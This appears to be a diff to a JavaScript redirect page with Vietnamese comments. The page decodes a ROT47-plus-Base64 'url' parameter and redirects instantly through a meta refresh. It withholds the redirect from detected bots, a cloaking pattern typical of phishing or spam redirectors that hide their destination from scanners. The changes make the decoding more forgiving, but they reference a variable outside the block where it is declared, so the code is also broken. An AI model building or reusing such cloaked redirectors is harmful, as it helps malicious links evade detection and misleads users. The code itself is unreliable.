@@ -12,7 +12,7 @@
         const params = new URLSearchParams(window.location.search);
         const data = params.get('url') || '';
 
-        // Hàm giải mã Base64 + ROT47, xử lý kỹ hơn
+        // Hàm giải mã Base64 + ROT47, xử lý kỹ hơn và kiểm tra Base64 cẩn thận
         function decodeAdvanced(input) {
             let rot47 = '';
             for (let i = 0; i < input.length; i++) {
@@ -24,16 +24,17 @@
                 }
             }
             try {
-                // Kiểm tra chuỗi Base64 trước khi giải mã
+                // Lọc và chuẩn hóa chuỗi Base64, chỉ giữ ký tự hợp lệ
+                const cleanedRot47 = rot47.replace(/[^A-Za-z0-9+/=]/g, '');
                 const base64Pattern = /^[A-Za-z0-9+/]+={0,2}$/;
-                if (!base64Pattern.test(rot47)) {
-                    console.error("Invalid Base64 string after ROT47:", rot47);
+                if (!base64Pattern.test(cleanedRot47)) {
+                    console.error("Invalid Base64 string after ROT47 (cleaned):", cleanedRot47);
                     return '';
                 }
-                const decodedBase64 = atob(rot47);
+                const decodedBase64 = atob(cleanedRot47);
                 return decodeURIComponent(decodedBase64); // Xử lý ký tự đặc biệt
             } catch (e) {
-                console.error("Invalid encoded URL:", e);
+                console.error("Invalid encoded URL:", e, "Raw ROT47:", rot47, "Cleaned ROT47:", cleanedRot47);
                 return '';
             }
         }
@@ -79,7 +80,7 @@
                     // Chuyển hướng tức thì qua thẻ meta
                     document.write(`<meta http-equiv="refresh" content="0;url=${encodeURI(destination)}">`);
                 } else {
-                    console.error("Failed to decode URL, showing default page. Raw ROT47:", rot47);
+                    console.error("Failed to decode URL, showing default page. Raw ROT47:", rot47, "Cleaned ROT47:", cleanedRot47);
                 }
             } else {
                 console.log("Bot detected, not redirecting.");
